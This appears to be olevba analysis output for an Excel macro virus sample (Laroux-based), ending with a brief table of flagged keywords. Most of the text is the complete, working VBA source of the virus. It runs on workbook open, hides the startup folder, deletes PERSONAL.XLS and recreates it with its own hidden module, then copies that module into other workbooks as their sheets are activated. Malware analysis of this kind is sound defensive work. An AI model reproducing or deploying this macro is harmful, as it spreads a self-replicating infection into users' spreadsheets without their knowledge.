olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux-based-19823103c8c78a1d74c2104d2bb47fa47558b533
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Module8.bas 
in file: Virus.MSExcel.Laroux-based-19823103c8c78a1d74c2104d2bb47fa47558b533 - OLE stream: '_VBA_PROJECT_CUR/VBA/Module8'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
Dim aa, bb, cc, dd As Variant
    On Error Resume Next
    Application.ScreenUpdating = False
    c$ = Application.StartupPath
    If Dir(c$) = "" Then MkDir (c$)
    SetAttr c$ & "\" & "PERSONAL.XLS", 0
    SetAttr c$, 2
    aa = Array(-4141, -4167, -4141, -4109, 3, -4141, -4109, -4167, 3, -4109, -4109, -4141, -4109, -4141, -4167, -4141, -4167, -4167, -4141, -4109, -4167, -4141)
    bb = Array(5, 3, 3, 3, 1, 7, 7, 8, 1, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 5, 5, 2)
    cc = Array(0, 3, 3, 3, 4, 4, 4, 4, 6, 8, 9, 10, 10, 11, 12, 12, 13, 14, 14, 2, 4, 11)
    dd = Array(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 3, 3, 3)
    For yy = 1 To 21
        If yy < 19 Then
        Set ff = MenuBars(aa(yy)).Menus(bb(yy))
        fn$ = ff.MenuItems(cc(yy)).Caption
        ff.MenuItems(cc(yy)).Delete
        ff.MenuItems.Add Caption:=fn$, before:=cc(yy)
        Else
        Set ff = MenuBars(aa(yy)).Menus(bb(yy)).MenuItems(cc(yy))
        fn$ = ff.MenuItems(dd(yy)).Caption
        ff.MenuItems(dd(yy)).Delete
        ff.MenuItems.Add Caption:=fn$, before:=dd(yy)
        End If
    Next
    yy = 0
    fn$ = MenuBars(aa(yy)).Menus(bb(yy)).Caption
    MenuBars(aa(yy)).Menus(bb(yy)).Delete
    MenuBars(aa(yy)).Menus.Add Caption:=fn$, before:=bb(yy)
    On Error GoTo e
    temp$ = ActiveWorkbook.Name
    Windows("PERSONAL.XLS").Close
    Kill c$ & "\" & "PERSONAL.XLS"
e:
    Application.OnSheetActivate = "Record8"
    Application.ScreenUpdating = True
End Sub
Sub Record8()
Attribute Record8.VB_ProcData.VB_Invoke_Func = " \n14"
    On Error Resume Next
    c$ = Application.StartupPath
    m$ = Dir(c$ & "\" & "PERSONAL.XLS")
    If m$ = "PERSONAL.XLS" Then p = 1 Else p = 0
    If ActiveWorkbook.Modules.Count > 0 Then w = 1 Else w = 0
    whichfile = p + w * 10
Select Case whichfile
    Case 10
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    Sheets("Module8").Visible = True
    Sheets("Module8").Select
    Sheets("Module8").Copy
    With ActiveWorkbook
        .Title = ""
        .Subject = ""
        .Author = ""
        .Keywords = ""
        .Comments = ""
    End With
    newname$ = ActiveWorkbook.Name
    c4$ = CurDir()
    ChDir Application.StartupPath
    ActiveWindow.Visible = False
    Workbooks(newname$).SaveAs FileName:=Application.StartupPath & "/" & "PERSONAL.XLS", FileFormat:=xlNormal _
        , Password:="", WriteResPassword:="", ReadOnlyRecommended:= _
        False, CreateBackup:=False
    ChDir c4$
    Workbooks(n4$).Sheets("Module8").Visible = False
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "personal.xls!Record8"
    Case 1
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    p4$ = ActiveWorkbook.Path
    s$ = Workbooks(n4$).Sheets(1).Name
    If s$ <> "Module8" Then
        Workbooks("PERSONAL.XLS").Sheets("Module8").Copy before:=Workbooks(n4$).Sheets(1)
        Workbooks(n4$).Sheets("Module8").Visible = False
    Else
    End If
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "personal.xls!Record8"
    Case Else
End Select
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     15 BOUNDSHEET : Sheet Information - Visual Basic module, hidden -  Module
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
+----------+--------------------+---------------------------------------------+

